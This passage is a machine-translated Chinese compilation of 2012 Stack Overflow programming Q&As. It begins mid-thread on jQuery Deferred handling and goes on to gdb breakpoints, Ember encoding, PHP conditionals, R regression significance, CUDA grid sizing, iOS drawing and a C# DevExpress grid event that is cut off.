缩短的初始化函数：

```
Shorty.Tracking.init:function(){
    // ...
    var dfd=new $.Deferred();
    // two dialogs are used by this plugin
    var dialogs={
      'list':  Shorty.Tracking.Dialog.List,
      'click': Shorty.Tracking.Dialog.Click
    };
    // load dialogs from server
    $.each(['list','click'],function(i,dialog){
      if (...){
        // ...
        dfd.resolve();
      }else{
        // load dialog layout via ajax and create a freshly populated dialog
        $.ajax({
          type:     'GET',
          url:      OC.filePath('shorty-tracking','ajax','layout.php'),
          data:     { dialog: dialog},
          cache:    false,
          dataType: 'json'
        }).pipe(
          function(response){return Shorty.Ajax.eval(response)},
          function(response){return Shorty.Ajax.fail(response)}
        ).done(function(response){
          // create a fresh dialog
          // insert it alongside the existing dialogs in the top controls bar
          $('#controls').append(response.layout);
          switch (dialog){
            case 'list':
              Shorty.Tracking.Dialog.List=$('#controls #shorty-tracking-list-dialog').first();
              break;
            case 'click':
              Shorty.Tracking.Dialog.Click=$('#controls #shorty-tracking-click-dialog').first();
          } // switch
          dfd.resolve();
        }).fail(dfd.reject)
      } // else
    }); // each
    return dfd.promise();
  }, 
```

* * *

随着Bergi的回答，我设法显然消除了原来的问题。到目前为止，我无法检测到更多失败的绑定尝试。但是我不能完全遵循这个建议：在他的回答中，他建议删除初始化方法中的 switch 语句以支持直接分配。这当然要优雅得多，但这行不通。我的印象是我对 javascript 如何处理存储在变量中的引用和/或函数存在一些误解。

也许您、Bergi 或其他人可以对此做出一些解释：

这是上面修改后的初始化方法：

```
 init:function(){
    if (Shorty.Debug) Shorty.Debug.log("initializing tracking list");
    // check if dialogs already exist
    if (   $.isEmptyObject(Shorty.Tracking.Dialog.List)
        && $.isEmptyObject(Shorty.Tracking.Dialog.Click) ){
      // two dialogs are used by this plugin
      var dialogs={
        'list':  Shorty.Tracking.Dialog.List,
        'click': Shorty.Tracking.Dialog.Click
      };
      // load dialogs from server
      var dfds=$.map(dialogs,function(obj,dialog){
        // load dialog layout via ajax and append it to the collection of dialogs in the controls
        return $.ajax({
          type:     'GET',
          url:      OC.filePath('shorty-tracking','ajax','layout.php'),
          data:     { dialog: dialog},
          cache:    false,
          dataType: 'json'
        }).pipe(
          function(response){return Shorty.Ajax.eval(response)},
          function(response){return Shorty.Ajax.fail(response)}
        ).done(function(response){
          // create a fresh dialog and insert it alongside the existing dialogs in the top controls bar
          $('#controls').append(response.layout);
//           obj=$('#controls #shorty-tracking-'+dialog+'-dialog').first();
          switch(dialog){
            case 'list':
              Shorty.Tracking.Dialog.List=$('#controls #shorty-tracking-list-dialog').first();
              break;
            case 'click':
              Shorty.Tracking.Dialog.Click=$('#controls #shorty-tracking-click-dialog').first();
              break;
          } // switch
        })
      }) // map
      return $.when.apply(null, dfds);
    }else{
      // dialogs already loaded, just clean them for usage
      Shorty.Tracking.Dialog.List.find('#list-of-clicks tbody tr').remove();
      new Deferred().resolve();
    } // else
  }, 
```

在中间，您会看到赋值语句被注释掉并且当前被下面的 switch 语句替换。我尝试了几种变体，例如 obj.element 等，但都失败了。在函数之外，变量 Shorty.Tracking.Dialog.List 和 Shorty.Tracking.-Dialog.Click 保持为空。

我是 web 东西和 js/jquery 的绝对新手。但我当然很想了解更多关于这种处理引用的方式。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T16:00:25.263

这是有问题的代码：

```
var dfd=new $.Deferred();
$.each(['list','click'], function(){
    ...
    dfd.resolve/fail();
}); 
```

您只创建了一个 Deferred，但会多次解决它。所以当第一个解决方案发生时，第二个 Ajax 就不会完成。

因此，改为使用两个 Deferred，并通过[`jQuery.when()`](http://api.jquery.com/jQuery.when/). 另外，我认为您不需要自己创建 Deferreds。就拿你从`pipe()`电话中得到的那两个。

```
function init() {
   var dialogs={
      'list':  Shorty.Tracking.Dialog.List,
      'click': Shorty.Tracking.Dialog.Click
   };
   var deferreds = $.map(dialogs, function(obj, dialog) {
       return $.ajax(...).pipe(...).done(...
           // really, don't use switch here:
           obj.element = response.layout;
       }); // done() returns the Deferred
   });
   return $.when.apply(null, deferreds);
}

...

$.ready(function($) {
    init().done(...);
}); 
```

* * *

好的，我需要解释一下 switch-Statement。确实，`dialogs`对象中的值将从 [未初始化] 变量分配并保持该值 ( `undefined`)，当重新分配字段时，`Shorty`值不会改变。Javascript 中没有“指针”。`dialog`我认为只有在成员运算符中使用当前变量而不是 switch 语句才会有用。要分配给`Shorty.Tracking.Dialog.List`and `.Click`，您需要使用类似的东西

```
var dialogs = ["list", "click"];
var shortcut = Shorty.Tracking.Dialog; // some object
for (var i=0; i<dialogs.length; i++) {
    // loop over them,
    // do the ajax stuff
    var element = $(repsonse.layout); // get the added element from the response
    $('#controls').append(element);

    shortcut[dialogs[i]] = element;
} 
```

（最终使用[How do I make the first letter of a string of a string in JavaScript? 中的一个片段？](https://stackoverflow.com/q/1026069/1048572)）

# c - 为什么 gdb 在从函数返回时停止在与“ib”显示不同的行？

> ID：11702143
> 
> 赞同：7
> 
> 时间：2012-07-28T15:07:19.577
> 
> 标签：c, linux, debugging, unix, gdb

这是我要调试的程序：

```
#include <stdio.h>
int i = 5;

int main(void)
{
    int x = 3;

    display(x);
    return 0;
}

void display(int x)
{
for ( i=0; i<x; ++i ) {
    printf("i is %d.\n", i);
}
} 
```

这段代码来自这里[http://www.dirac.org/linux/gdb/05-Stepping_And_Resuming.php#breakpointsandwatchpoints](http://www.dirac.org/linux/gdb/05-Stepping_And_Resuming.php#breakpointsandwatchpoints)。这是问题所在：

```
(gdb) break display 
Breakpoint 1 at 0x40051e: file try5.c, line 15.
(gdb) run
Starting program: /home/ja/gdb/learning/try5 

Breakpoint 1, display (x=3) at try5.c:15
(gdb) frame 1
#1  0x000000000040050c in main () at try5.c:8
(gdb) break 
Breakpoint 2 at 0x40050c: file try5.c, line 8.
(gdb) c
Continuing.
i is 0.
i is 1.
i is 2.

Breakpoint 2, main () at try5.c:9
(gdb) i b
Num     Type           Disp Enb Address            What
1       breakpoint     keep y   0x000000000040051e in display at try5.c:15
    breakpoint already hit 1 time
2       breakpoint     keep y   0x000000000040050c in main at try5.c:8
    breakpoint already hit 1 time
(gdb) c
Continuing.

Program exited normally.
(gdb) q

Debugger finished 
```

它应该在 main() 的第 8 行停止，**但**它在 main() 的第 9 行停止。对我来说，这是误导。我认为它应该在第 9 行停止，因为这就是“break”命令的作用——在下一条指令处设置断点。但是为什么“信息断点”说断点设置在第 8 行呢？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-28T15:38:43.393

如您所见，断点放置在*正确*的位置，因为它在从函数返回后确实中断了。如果您进行反汇编，您还会看到断点位于正确的指令处（在此示例中为 0x00401192）：

```
b display
r
f 1
b
disassemble $pc
...
   0x0040118d <+29>:    call   0x401199 <display>
=> 0x00401192 <+34>:    mov    $0x0,%eax
   0x00401197 <+39>:    leave

i b
...
2       breakpoint     keep y   0x00401192 in main at try5.c:8 
```

但它显示错误的行号。一开始我以为可能和函数返回有关，所以我在显示调用后添加了额外的指令，但它仍然显示错误的行。

这在我看来是一个错误。

# javascript - Ember.js，正文后添加的奇怪字符

> ID：11702145
> 
> 赞同：0
> 
> 时间：2012-07-28T15:07:25.027
> 
> 标签：javascript, ember.js

运行此示例 'bare bone' 独立示例

```
<html>
<head>
  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
  <script type="text/javascript" src="http://cloud.github.com/downloads/wycats/handlebars.js/handlebars-1.0.0.beta.6.js"></script>
  <script type="text/javascript" src="http://dl.dropbox.com/u/3024625/ember.js"></script>
  <script type="text/javascript">
  $(window).load(function(){
    var App = Ember.Application.create({
      ready: function() {
        this.layout = App.ApplicationView.create();
        this.layout.appendTo('body');
      }
    });
    App.ApplicationView = Ember.View.extend({
      template: Ember.Handlebars.compile('<h1>Application</h1>')
    });
    App.initialize();
  });
  </script>

  <script type="text/x-handlebars" data-template-name="application">
    test
  </script>​
</head>
<body>
</body>
</html> 
```

给出这个输出：

```
<body class="ember-application">â€‹

<div id="ember129" class="ember-view"><h1>Application</h1></div></body> 
```

注意“â€‹”字符。看起来像一个编码问题，但在另一种设置中，这些字符在所有页面上方采用新行的形式（这就是我注意到问题的原因）。

删除

```
 <script type="text/x-handlebars" data-template-name="application">
    test
  </script>​ 
```

线条，让人物走开。

我对最新的 Ember.js (master) 和一个月前的构建有同样的问题。

还有其他人有这个问题吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-28T18:05:57.397

奇怪，看起来这是通过您提供的代码中第 23 行末尾的尾随空字符复制的。如果您删除它，它也可以工作 - 也适用于未使用的模板`application`。

我做了一些进一步的调查，看起来隐形字符是 a `ZERO WIDTH SPACE`，请参阅[http://www.ltg.ed.ac.uk/~richard/utf-8.cgi?input=%26%238203%3B&mode=char](http://www.ltg.ed.ac.uk/~richard/utf-8.cgi?input=%26%238203%3B&mode=char)。

# javascript - 在 $.post 函数中访问 $(this)？

> ID：11702146
> 
> 赞同：1
> 
> 时间：2012-07-28T15:07:30.653
> 
> 标签：javascript, jquery, html, ajax, this

我在访问帖子内函数内部的 $(this) 时遇到了很多麻烦，我要做的就是根据响应删除对象类。

```
 $.post("url.php?"+theData, {}, function(response){  etc..... 
```

它适用于静态#ID，但我更愿意操纵 $this

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-28T15:13:54.957

尝试

```
var self = this; 
$.post("url.php?"+theData, {}, function(response){
    $(self).show(); // manipulate this
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T15:10:52.183

这是来自异步事件的回调，因此`this`指向该元素的 会丢失。

您需要保留对*外部* `this`（元素）的引用。一种方法是通过一个立即执行的函数来绑定它：

```
$('#something').on('click', function() {
    $.post('somewhere.php').done((function(el) { return function(response) {
        $(el).removeClass('someClass');
    }; })(this));
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-28T15:16:31.630

变量`this`总是指向当前上下文对象。

```
var obj = { // declare object
  a: 2,

  b: function (p) { 
    alert(this.a + p); // here 'this' will point to obj if it was run by 'obj.b();' 
  }
};

obj.b(2); // call it's method 
```

您也可以设置当前的“this”：

```
var s = { a: 3 };

var obj = {
  a: 2,

  b: function (p) { 
    alert(this.a + p); // here 'this' will be s 
  }
};

obj.b.call(s, 2); 
```

例如，如果您在另一个 (f2) 中使用 2 个函数 (f1) 并且 f1 的上下文应该在 f2 中可用，那么最简单的方法是将其存储在变量中；

```
$(buttonSelector).click(function () {
  var button = $(this);

  $.post(url, function (data) {
    //here button is available
  };
}); 
```

# r - 计算回归系数在 R 中是否具有统计显着性

> ID：11702147
> 
> 赞同：2
> 
> 时间：2012-07-28T15:07:57.313
> 
> 标签：r, statistics, regression, standard-error

我有使用另一个程序进行的回归分析的结果，我想用 R 测试它们是否显着。我知道 ls.diag() 计算回归结果的标准误差和 t 检验，但它需要非常特定的输入格式（即 lsfit() 的结果），所以我认为我不能使用它。r 中是否有任何函数可以计算回归分析的标准误差和 t 检验，让我可以简单地手动将相关系数赋予函数？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-28T16:46:59.417

我不太确定这是你要找的东西，但这里有一个指南

```
# this is a model obtained from ?lm 
ctl <- c(4.17,5.58,5.18,6.11,4.50,4.61,5.17,4.53,5.33,5.14)
trt <- c(4.81,4.17,4.41,3.59,5.87,3.83,6.03,4.89,4.32,4.69)
group <- gl(2,10,20, labels=c("Ctl","Trt"))
weight <- c(ctl, trt)
lm.D9 <- lm(weight ~ group)
summary(lm.D9) this is our target 
```

假设我们只有回归系数、标准误和样本量

```
beta <- coef(lm.D9)
errorBeta <- summary(lm.D9)$coefficients[,2]
n <- length(weight) # the sample size
k <- length(beta) # number of regression parameters 
```

我认为这是你的情况，如果你没有系数标准误差，那么你必须估计它们，这很容易。

一旦有了回归系数及其标准误差，就可以估计 t-stat：

```
t_stats <- beta/errorBeta 
```

经验法则表明，如果 |t_stats| >= 2，则该系数在 5% 的水平上具有统计显着性。但是，如果您想知道 p 值，请使用：

```
pt(abs(t_stats), n-k, lower.tail=FALSE)*2 
```

如果 p 值 > 0.05，则相关系数在该水平上没有统计学意义。

您所需要的只是了解系数、其标准误差和样本量。否则你不会这样做。

# android - XML“中止构建”

> ID：11702148
> 
> 赞同：0
> 
> 时间：2012-07-28T15:07:59.450
> 
> 标签：android, xml

在这段代码中 -

```
<CheckBox android:id="@+id/cb_list"
android:layout_height="50dip"
 android:layout_width="50dip"
 android:text="CheckBox" /> 
```

Eclipse 向我发送此错误：

```
Error in an XML file: aborting build. 
```

这是完整的代码（要求 0gravity），即使问题出在“复选框”中（至少 eclipse 是这么说的）

```
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <CheckBox android:id="@+id/cb_list"
    android:layout_height="50dip"
     android:layout_width="50dip"
     android:text="CheckBox" />

    <TextView xmlns:android="http://schemas.android.com/apk/res/android"
     android:id="@+id/label"
     android:layout_height="wrap_content"
     android:layout_width="wrap_content"
     android:textSize="12dip"
     android:textStyle="normal">
    </TextView>
</resources> 
```

有什么问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T15:12:37.220

确保您的错误不是由 Lint 触发的。在这种情况下，由于硬编码字符串，Lint 可能会警告您。

无论如何，该检查的默认严重性应该是“警告”，而不是“错误”。

**编辑：**

看到您的编辑，我认为您的错误是您的根节点。您正在将元素设置在`<resources>`标签下，它应该是一个布局持有者，例如`RelativeLayout`, `LinearLayout`, ....

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T15:17:04.503

您发布的代码中的问题是您需要添加：

```
xmlns:android="http://schemas.android.com/apk/res/android" 
```

在您的参数复选框内，例如：

```
 <CheckBox 
        xmlns:android="http://schemas.android.com/apk/res/android"
        android:id="@+id/cb_list"
        android:layout_height="50dip"
        android:layout_width="50dip"
        android:text="CheckBox" /> 
```

希望有帮助。

# php - 是否有关于何时在 PHP 中使用 != 而不是 (!condition) 的指南？

> ID：11702151
> 
> 赞同：0
> 
> 时间：2012-07-28T15:08:24.853
> 
> 标签：php

是否有关于何时使用`!=`而不是`(!condition)`检查条件是真还是假的规则或指南？

例如，我有一些页面在返回任何内容之前检查是否启用了 TLS：

`if ($_SERVER['HTTPS'] !== 'on') { exit; }`

但我也可以这样写：

`if (!$_SERVER['HTTPS'] === 'on') { exit; }`

对于某些语句，使用后者似乎最干净，例如：

`if (!isset($_SESSION)) { session_start(); }`

...比同等的短：

`if (isset($_SESSION) == false) { session_start(); }`

是否有编写这些陈述的标准或指南，或者只是偏好？

注意：我理解 和 之间的区别`==`，`===`我只是想确保我的代码尽可能清晰简洁。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T15:18:29.133

不要这样做：

```
if (!$_SERVER['HTTPS'] === 'on') { exit; } 
```

！具有比 === 更高的优先级，因此计算结果为：

```
if ((!$x) === 'on') { ... } 
```

在这种情况下，!$x 会将 $x 转换为布尔值，然后将其反转。所以，如果 $x 里面有任何东西，你最终会得到：

```
if (false === 'on') { ... } 
```

这永远不会匹配任何 $x 的值。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-28T15:14:51.760

我会对此提出异议

```
if (!$_SERVER['HTTPS'] === 'on') { exit; } 
```

与第一个变体相比，指示性较小，因此可读性较差。

任何时候你有简单的东西

```
if ($var) 
```

或者

```
if (!$var) 
```

您正在做的是将传递的值强制为它们的真值/假值。因此，这与以下内容不同：

```
if ($var === 'on') 
```

这是针对特定比较（而不是其真/假）进行测试。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-28T15:13:22.340

好吧，这真的取决于你，但我尽量让事情听起来尽可能接近英语。

你可以说：

```
If switch is not on then… 
```

或者

```
If not switch is on then… 
```

我个人会说最上面的那个，所以会编写代码来遵循它。

对于第二种风格，如果事物返回布尔值（即真或假），我从不将其与真或假进行比较，除非您必须使用`strpos`.

再次想到英语：

```
If not is set variable… 
```

或者

```
If is set variable is false… 
```

就个人而言，顶部听起来更好，但当然两者在英语中都不正确。

这个逻辑也有助于命名变量和函数，所以我认为值得考虑。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-28T15:21:47.817

not`!`运算符反转语句。在条件中，它用于检查特定值是否会评估为`false`。在[PHP 手册](http://php.net/manual/en/language.types.boolean.php)中，以下值将评估为 false：

*   布尔值`FALSE`
*   整数`0`和浮点数`0.0`
*   一个空字符串*和*一个包含零 ( `"0"`)的字符串
*   一个空数组
*   `NULL`和未设置的变量
*   从空标签创建的 SimpleXML 对象
*   （仅限 PHP 4）具有零变量的对象

鉴于此，当您检查变量是否为*falsy*时，您应该使用 not 运算符。

对于任何其他情况，您需要明确检查该值。

顺带一提，`if ($_SERVER['HTTPS'] !== 'on') { exit; }`又`if (!$_SERVER['HTTPS'] === 'on') { exit; }`大不一样。前者检查`$_SERVER['HTTPS']`变量是否**没有**值`on`。另一方面，后者将*的*值取反`$_SERVER['HTTPS']`，然后与它进行比较，`on`如果它们相等则返回 true。

因此，例如 if `$_SERVER['HTTPS']`is 最初`"off"`（一个非零字符串，因此，`true`）`!$_SERVER['HTTPS']`将返回`false`，然后将其与`"on"`. 由于`false`和`"on"`不相等，因此您的`if`条件将不会被执行。

该`isset`函数返回一个布尔值，因此完全可以这样做，`if (!isset($_SESSION)) { session_start(); }`因为这将检查是否`$_SESSION`为假（如果是则执行该`if`语句）。

# cuda - 计算cuda内核所需块数的基本/简单公式

> ID：11702158
> 
> 赞同：0
> 
> 时间：2012-07-28T15:09:05.537
> 
> 标签：cuda

我在 CUDA 中获得每个网格的正确块数时遇到了一些困难。任何人都可以显示基本/简单的公式来计算 CUDA 内核中 2D 所需的块数吗？（即gridDim.x和gridDim.y）考虑到用户想要运行N个线程总数，并且他的块是A乘B（其中A * B <= 512或1024取决于计算能力），或者为了简单案例让我们假设他的积木是 8 x 8。再次感谢。你也能指出我们必须记住哪些事情，例如它们是否是二的幂真的很重要......

```
 dim3 dimBlock(A,B);
 dim3 dimGrid(Z,T); 
```

我在找 Z 和 T。谢谢！！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T16:24:39.017

线程总数`N`由下式计算

```
N = No_blocks * No_threads_per_block 
```

所以你`A*B`每个块都有线程，所以你应该有`Z*T=N/(A*B)`.

`Z`当然应该是整数，`T`但不需要是 2 的幂。此外，取决于您的 CUDA 计算能力，网格的每个维度中的块数都有限制。

# iphone - 将 CustomBadge 添加到导航栏中的 UISegmentedControl

> ID：11702159
> 
> 赞同：1
> 
> 时间：2012-07-28T15:09:08.253
> 
> 标签：iphone, ios, uisegmentedcontrol, badge

在 a 中有`UISegmentedControl`一个`navigationBar`，它在 the 中创建`Storyboard`并且有一个`Outlet`连接到它。我曾尝试向 中添加自定义徽章`UISegmentedControl`，但失败了。徽章不出现。

**附言。**当我将自定义徽章添加到`navigationBar`（的超级视图`UISegmentedControl`）时，会出现自定义徽章，但它是我的第二种方法。我想直接添加到`UISegmentedControl`，可以吗？

**MyTableViewController.h**

```
...

@interface MyTableViewController : UITableViewController{
} 

@property (strong,nonatomic) IBOutlet UISegmentedControl  *segmentedControl;

... 
```

**MyTableViewController.m**

```
@synthesize segmentedControl;

...

- (void)viewDidAppear:(BOOL)animated
{
    [super viewDidAppear:animated];
    CustomBadge *customBadge = [CustomBadge customBadgeWithString:@"1" withStringColor:[UIColor whiteColor] withInsetColor:[UIColor orangeColor] withBadgeFrame:YES withBadgeFrameColor:[UIColor whiteColor] withScale:0.8 withShining:YES];

NSLog(@"self.segmentedControl :%@",self.segmentedControl);
NSLog(@"self.segmentedControl w: %f, h :%f",self.segmentedControle.frame.size.width, self.segmentedControlle.frame.size.height);
NSLog(@"customBadge x: %f, y: %f, w: %f, h :%f", customBadge.frame.origin.x, customBadge.frame.origin.y,customBadge.frame.size.width, customBadge.frame.size.height);

    [self.segmentedControl addSubview:customBadge];
}

... 
```

**日志结果：**

```
self.segmentedControl :<UISegmentedControl: 0x3b7bf0; frame = (83 7; 154 30); opaque = NO; autoresize = RM+BM; layer = <CALayer: 0x3b7c70>>
self.segmentedControl w: 154.000000, h :30.000000
customBadge x: 0.000000, y: 0.000000, w: 20.000000, h :20.000000 
```

这`CustomBadge`是第三方自定义徽章视图类。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T15:52:56.810

很好！谢谢。现在，可能是分段控件不是真正的视图，因为它的内容反映在子视图中（Mac上有这样的东西，比如选项卡视图） - 它们管理视图数组，因此它们不当子视图在 drawRect 方法中绘制时，它们并没有真正关注它们。所以这个控件可能会在它的drawRect中绘制你的徽章。你将不得不进一步调查。

尽管如此，还是有一个解决方案，就是创建一个大小相同的容器 UIView，先添加分段控件，然后再添加您的自定义徽章，然后将该容器视图添加到 UINavigationBar。那应该行得通。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T15:30:33.430

我从未使用过CutomBadge，但我认为您需要设置框架。

# iphone - 使用 RoundedRect 对 UIBezierpath 进行抗锯齿

> ID：11702170
> 
> 赞同：0
> 
> 时间：2012-07-28T15:10:36.830
> 
> 标签：iphone, ios, core-graphics, uibezierpath

我用 UIBezierpath 创建了一个圆角矩形，这对我很有用。只有一个问题是矩形的圆边有一种锯齿效应。这是一张图片![拐角处混叠](../Images/85bb7f2099746c6b9dbb80648bbb787a.png)

我像这样创建圆角矩形：

```
CGFloat radius = 12;
CGRect frame1 = CGRectMake(self.bounds.origin.x, self.bounds.origin.y+(self.bounds.size.height/heightFactor), self.bounds.size.width-shadowConst, self.bounds.size.height-(self.bounds.size.height/heightFactor)-shadowConst);

CGRect frame2 = CGRectMake(self.bounds.size.width-(self.bounds.size.width/widthFactor), self.bounds.origin.y+(self.bounds.size.height/(heightFactor*2)), (self.bounds.size.width/widthFactor)-shadowConst, (self.bounds.size.height/heightFactor));

UIBezierPath *result =
[UIBezierPath bezierPathWithRoundedRect: frame1 cornerRadius:radius];
[result appendPath:
 [UIBezierPath bezierPathWithRoundedRect: frame2 cornerRadius:radius]];
[result fill];
[result addClip];
CGContextDrawLinearGradient(context, gradient2, CGPointMake(0, 0), CGPointMake(0, self.bounds.size.height), 0); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T16:49:15.113

据我所知，这可能是两个问题之一：

您正在使用组合时看起来很奇怪的颜色进行绘制。灰色之上的亮绿色可能使它看起来很奇怪。

此外，对于您的 shadowConst 和 heightFactor，请注意不要分割，因此框架的大小或位置为 0.5。因此，例如，如果您想要的宽度大小为 equals `[size].5`，它将绘制模糊的一面。如果将框架的 x 或 y 值设置为`[value].5`

# c#-4.0 - 双击一行后如何将选定 Xtragridview 的值传递到另一个表单的文本框（使用观察者模式概念）

> ID：11702171
> 
> 赞同：0
> 
> 时间：2012-07-28T15:10:48.173
> 
> 标签：c#-4.0, gridview, devexpress, observer-pattern, double-click

在下面找到我用来将gridview中选定行的值传递到另一个表单上的文本框的代码示例；有这样的场景：我有 2 个表单第一个表单包含一个按钮和文本框，该按钮打开第二个表单“表单 2”。form2 包含 Xtragrid ，我想从这个表单执行双击事件以加载第一个表单中的每个选定行值..

好吧，我已经用你的方法修改了我的代码，但什么都没发生，也许我忽略了一些东西，如果你也可以看看，也许你可能会从我这边想出一些东西我仍然不明白为什么？？？？

```
// Class SEarchLessee
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace YoungWoman
{
public class SearchLessee 
{
    public int Lesseeid { get; set; }
    public string Name { get; set; }
    public string LastName { get; set; }
}

}

 // custom event

 using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;

 namespace YoungWoman
 {
  public class CustomDoubleClickEventArgs : EventArgs
  {
    public SearchLessee SearchLessee { get; set; }
  }

  }

   // form 2 with Xtragrid

   using System;
   using System.Collections.Generic;
   using System.ComponentModel;
   using System.Data;
   using System.Drawing;
   using System.Linq;
   using System.Text;
   using System.Windows.Forms;
   using System.Data.SqlClient;
   using DevExpress.XtraGrid.Views.Grid;
   using DevExpress.XtraEditors;

   namespace YoungWoman
   {
       public partial class SelectLessee : XtraForm
         {

    SqlConnection conne = SqlCoonectionSEtup.GetConnection;
    DataTable dt = new DataTable();

    public event EventHandler<CustomDoubleClickEventArgs> CustomViewDoubleClick;

    public SelectLessee()
    {
        InitializeComponent();
    }
   // private List<IUserObserver> ObserverObject = new List<IUserObserver>();

    private void AddLesseebtn_Click(object sender, EventArgs e)
    {
        Lesseefrm frm = new Lesseefrm(Utils.Formtype.add, 0);
        frm.SelectEventHandler += new EventHandler(RefreshGrid);
        frm.ShowDialog();

    }

    private void editbtn_Click(object sender, EventArgs e)
    {
        Lesseefrm frm1 = new Lesseefrm(Utils.Formtype.edit, 1);
        frm1.ShowDialog();
    }

    private void SelectLessee_Load(object sender, EventArgs e)
    {

        SqlDataAdapter sda = new SqlDataAdapter("SELECT  *FROM LesseeYW", conne);
        (dt).Clear();
        sda.Fill(dt);
        LesseegridControl.DataSource = dt;
        RefreshGrid();
        GridView.Columns[1].Visible = false;
        GridView.Columns[4].Visible = false;
        GridView.Columns[5].Visible = false;
        GridView.Columns[6].Visible = false;
        GridView.Columns[7].Visible = false;
        GridView.Columns[9].Visible = false;
        GridView.Columns[10].Visible = false;
        GridView.Columns[11].Visible = false;
        GridView.Columns[12].Visible = false;
        GridView.Columns[13].Visible = false;
        GridView.Columns[15].Visible = false;
        GridView.Columns[16].Visible = false;
        GridView.Columns[17].Visible = false;
        GridView.Columns[19].Visible = false;

    }
    void RefreshGrid(object sender, EventArgs e)
    {

        RefreshGrid();

    }

    private void RefreshGrid()
    {
        SqlDataAdapter sda = new SqlDataAdapter("SELECT  *FROM LesseeYW", conne);
        (dt).Clear();
        sda.Fill(dt);
        LesseegridControl.DataSource = dt;
        LesseegridControl.RefreshDataSource();
    }

    private void Searchbtn_Click(object sender, EventArgs e)
    {
        if (radioButton1.Checked)
        {
            txtPhoneNo.Enabled = false;
            txtPassportNo.Enabled = false;
            txtIdNo.Enabled = false;

            SqlDataAdapter sda = new SqlDataAdapter("SELECT * FROM LesseeYW WHERE LesseeId =" + int.Parse(txtLesseeId.Text), conne);
            (dt).Clear();
            sda.Fill(dt);
            LesseegridControl.DataSource = dt;

            GridView.Columns[1].Visible = false;
            GridView.Columns[4].Visible = false;
            GridView.Columns[5].Visible = false;
            GridView.Columns[6].Visible = false;
            GridView.Columns[7].Visible = false;
            GridView.Columns[9].Visible = false;
            GridView.Columns[10].Visible = false;
            GridView.Columns[11].Visible = false;
            GridView.Columns[12].Visible = false;
            GridView.Columns[13].Visible = false;
            GridView.Columns[15].Visible = false;
            GridView.Columns[16].Visible = false;
            GridView.Columns[17].Visible = false;
            GridView.Columns[19].Visible = false;

        }

        if (radioButton2.Checked)
        {
            txtLesseeId.Enabled = false;
            txtPassportNo.Enabled = false;
            txtPhoneNo.Enabled = false;

        }

        if (radioButton3.Checked)
        {
            txtPassportNo.Enabled = false;
            txtLesseeId.Enabled = false;
            txtIdNo.Enabled = false;
        }

        if (radioButton4.Checked)
        {
            txtIdNo.Enabled = false;
            txtLesseeId.Enabled = false;
            txtPhoneNo.Enabled = false;
        }

    }

    private void DisplayallBtn_Click(object sender, EventArgs e)
    {

        SqlDataAdapter sda = new SqlDataAdapter("SELECT  *FROM LesseeYW", conne);
        (dt).Clear();
        sda.Fill(dt);
        LesseegridControl.DataSource = dt;
        GridView.Columns[1].Visible = false;
        GridView.Columns[4].Visible = false;
        GridView.Columns[5].Visible = false;
        GridView.Columns[6].Visible = false;
        GridView.Columns[7].Visible = false;
        GridView.Columns[9].Visible = false;
        GridView.Columns[10].Visible = false;
        GridView.Columns[11].Visible = false;
        GridView.Columns[12].Visible = false;
        GridView.Columns[13].Visible = false;
        GridView.Columns[15].Visible = false;
        GridView.Columns[16].Visible = false;
        GridView.Columns[17].Visible = false;
        GridView.Columns[19].Visible = false;

    }

    private void GridView_DoubleClick(object sender, EventArgs e)
    {
        if (CustomViewDoubleClick == null)
            return; 

         CustomViewDoubleClick(this, new CustomDoubleClickEventArgs() 

         {
             SearchLessee = new SearchLessee()

             {
               LastName = GridView.GetFocusedRowCellValue("LesseeLastName").ToString(),
               Name =GridView.GetFocusedRowCellValue("LesseeName").ToString(),
               Lesseeid =Convert.ToInt32(GridView.GetFocusedRowCellValue("LesseeId"))
             }

         });
       }

     }
   }

    // form1 showing the data

    using System;
    using System.Collections.Generic;
    using System.ComponentModel;
    using System.Data;
    using System.Drawing;
    using System.Linq;
    using System.Text;
    using System.Windows.Forms;
    using YoungWoman.Utils;
    using YoungWoman.Properties;
    using DevExpress.XtraGrid.Views.Grid;
    using DevExpress.XtraEditors;

    namespace YoungWoman
     {
         public partial class Reservationfrm : XtraForm
        {
           SelectLessee SearchLs;

               public Reservationfrm()
           {
                InitializeComponent();

           }

    private Formtype formtype = Formtype.none;
    private int Reservationid = 0;

    public Reservationfrm(Formtype formtype , int Reservationid)
    {
        InitializeComponent();
        this.formtype = formtype;
        this.Reservationid = Reservationid;
    }

    private void Reservationfrm_Load(object sender, EventArgs e)
    {

        SearchLs = new SelectLessee();
        SearchLs.CustomViewDoubleClick += OnDoubleClick;

        dateEdit1.DateTime = DateTime.Today;
        dateEdit2.DateTime = DateTime.Today.AddDays(1);
        ChangingForm();

    }

    private void ChangingForm()
    {
        if (formtype == Formtype.add)
        {
            ReservationIdtextEdit.Enabled = false;
            this.Text = string.Format(" New Reservation");

        }
        else
            if (formtype == Formtype.edit && Reservationid > 0)
            {
                ReservationIdtextEdit.Enabled = false;
                SaveBtn.Text = "&Edit";
                SaveBtn.Image = Resources.brush_16;
                this.Text = string.Format(" Edit Reservation ");

            }
            else
                if (formtype == Formtype.addSelected && Reservationid > 0)
                {
                    ReservationIdtextEdit.Enabled = false;
